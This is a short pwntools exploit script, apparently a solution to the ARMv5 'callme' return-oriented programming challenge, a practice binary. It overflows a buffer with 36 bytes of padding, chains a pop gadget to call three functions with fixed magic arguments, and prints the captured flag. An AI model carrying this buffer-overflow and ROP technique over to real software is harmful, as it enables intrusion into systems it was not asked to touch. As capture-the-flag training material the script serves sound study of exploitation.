#!/usr/bin/puthon3
from pwn import process, p32, log

shell = process("./callme_armv5")

offset = 36
junk = b"A" * offset

callme1 = p32(0x10618)
callme2 = p32(0x1066c)
callme3 = p32(0x1060c)

pop3_lr_pc = p32(0x10870)

arguments  = b""
arguments += p32(0xdeadbeef)
arguments += p32(0xcafebabe)
arguments += p32(0xd00df00d)

payload  = b""
payload += junk
payload += pop3_lr_pc
payload += arguments + pop3_lr_pc + callme1
payload += arguments + pop3_lr_pc + callme2
payload += arguments + pop3_lr_pc + callme3

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")
